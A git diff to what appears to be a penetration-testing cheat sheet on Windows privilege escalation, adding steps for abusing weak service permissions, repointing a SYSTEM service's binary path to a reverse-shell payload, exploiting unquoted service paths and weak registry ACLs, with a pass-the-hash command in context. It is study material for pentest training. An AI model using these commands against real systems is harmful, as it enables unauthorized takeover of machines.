@@ -713,27 +713,33 @@ pth-winexe -U user%<LM Hash>:<NT Hash> //$RHOST cmd
 ```icacls "$PATH" /grant $USER:F /T```
 
 **Service Commands** \
-Query the configuration of a service:\
-```sc qc <service name>``` \
-Query the current status of a service:\
-```sc query <service name>``` \
-Modify a configuration option of a service: \
-```sc config <service name> <option>= <value> ``` \
-Start/Stop a service: \
-```net start/top <service name>``` \
+Query the configuration of a service: ```sc qc <service name>``` \
+Query the current status of a service: ```sc query <service name>``` \
+Modify a configuration option of a service: ```sc config <service name> <option>= <value> ``` \
+Start/Stop a service: ```net start/top <service name>``` \
+
+For services running as SYSTEM, check for weak service permissions (ACL) using ```accesschk.exe``` within Sysinternals: ```accesschk /accepteula -uwcqv user <service name> ``` \
+SERVICE_STOP, SERVICE_START => allow us to start/stop the service\
+SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS => allow us to modify the service config
+
+If we can change the config of a service with SYSTEM priv, we can change the executable of the service to use our custom executable. HOWEVER, we need the permission to start/stop the service. \
+Change the config path of a service, point it to the reverse shell payload: ```sc config <service name> binpath= "\"C:\Users\Public\rev.exe\"" ```, set up a listener and restart the service.
 
 
+**Check for unquoted service path:** \
+If an unquoted path service is spotted: ```C:\Program Files\Unquoted Path Service\Common Files\thisservice.exe``` \
+Check access on ```C:\```, ```C:\Program Files```, ```C:\Program Files\Unquoted Path Service```, ```C:\Program Files\Unquoted Path Service\Common Files``` with ```accesschk``` \
+```accesschk /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"``` \
+![image](https://user-images.githubusercontent.com/20218092/125386701-d62f1c80-e3f0-11eb-992b-e0e0ef94ba11.png)
+
+Showing we have RW access to ```C:\Program Files\Unquoted Path Service\``` \
+Write a payload called ```Common.exe``` \
+When the service is restarted, ```Commom.exe``` will be executed.
 
 
-**Check for unquoted service path:**
+**Check for Weak Registry permission:** \
+Windows registry contains entries for services and have ACL. If the registry ACL can be configured => privilege escalation vector. \
 
-If the path contains a space and is not quoted, the service is vulnerable.\
-E.g.:
-```C:\Program Files\Box\run.exe```
-
-
-It can be exploited by dropping a payload called ```program.exe``` on ```C:\program.exe```\
-Payload can be generated with ```msfvenom```, once the service is manually restarted or after rebooting, ```program.exe``` will be executed.
 
 
 **If autologon credential is captured. We can try to log in as admin:**
@@ -758,6 +764,7 @@ SeAssignPrimaryPrivilege: can be exploited rottenpotato, juicypotato\
 SeBackupPrivilege: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens\
 etc.
 
+If Windows 7 is detected, check for potential Eternal Blue or Kernel Exploit.
 
 https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation
 https://butter0verflow.github.io/oscp/OSCP-WindowsPrivEsc-Part1/
